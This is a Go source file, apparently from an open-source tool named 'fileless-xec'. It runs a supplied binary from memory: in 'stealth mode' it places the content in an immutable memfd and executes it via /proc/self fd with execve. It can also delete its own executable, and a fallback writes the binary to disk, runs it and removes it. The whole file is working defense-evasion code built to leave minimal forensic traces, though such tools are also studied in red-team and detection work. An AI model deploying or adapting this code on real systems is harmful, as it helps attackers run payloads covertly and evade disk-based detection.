// +build !windows

package exec

import (
	"fileless-xec/pkg/config"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"runtime"
	"syscall"

	"github.com/justincormack/go-memfd"
)

//Remove current file while its execution
func selfRemove() {
	err := os.Remove("./fileless-xec")
	if err != nil {
		fmt.Println(err)
	}
}

//UnstealthyExec file retrieve output. TODO: output in real-time + handle input
func UnstealthyExec(filename string, argv []string, envv []string) (err error) {
	defer os.Remove(filename) //with runtime.GOOS != "windows" we could remove earlier
	cmd := exec.Command("./" + filename)
	cmd.Args = argv
	cmd.Env = envv
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return err
	}

	if err := cmd.Start(); err != nil {
		return err
	}

	data, err := ioutil.ReadAll(stdout)

	if err != nil {
		return err
	}
	if err := cmd.Wait(); err != nil {
		return err
	}

	fmt.Println(string(data))
	return err
}

//Exec binary file using file descriptor
//Note: syscall.Exec does not return on success, it causes the current process to be replaced by the one executed
func Fexecve(fd uintptr, argv []string, envv []string) (err error) {
	fname := fmt.Sprintf("/proc/%d/fd/%d", os.Getpid(), fd)
	err = syscall.Exec(fname, argv, envv)
	return err
}

// Write Binary file on disk and chmod it to make it executable
func WriteBinaryFile(filename string, content string) (err error) {
	f, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.WriteString(content)
	if err != nil {
		return err
	}
	//Make file executable
	err = os.Chmod(filename, 0700)
	if err != nil {
		return err
	}
	return nil
}

//Create a memfd with binary content and return it
func PrepareStealthExec(content string) (mfd *memfd.Memfd) {
	mfd, err := memfd.Create()
	if err != nil {
		panic(err)
	}
	//defer mfd.Close()
	_, _ = mfd.WriteString(content)
	err = mfd.SetImmutable()
	if err != nil {
		panic(err)
	}

	return mfd
}

//Exec a file witth filess-xec
func Filelessxec(cfg *config.Config) {
	if cfg.Unstealth || runtime.GOOS == "windows" { //Unstealth mode
		binary := "dummy"
		if runtime.GOOS == "windows" {
			binary += ".exe"
		}
		//write binary file locally
		err := WriteBinaryFile(binary, cfg.BinaryContent)
		if err != nil {
			fmt.Println(err)
		}
		//execute it
		err = UnstealthyExec(binary, cfg.ArgsExec, cfg.Environ)
		fmt.Println(err)

		if cfg.SelfRm && runtime.GOOS != "windows" {
			selfRemove()
		}
	} else { //Stealth mode

		mfd := PrepareStealthExec(cfg.BinaryContent)
		defer mfd.Close()
		fd := mfd.Fd()

		if cfg.SelfRm && runtime.GOOS != "windows" {
			selfRemove()
		}

		Fexecve(fd, cfg.ArgsExec, cfg.Environ) //all line after that won't be executed due to syscall execve
	}
}
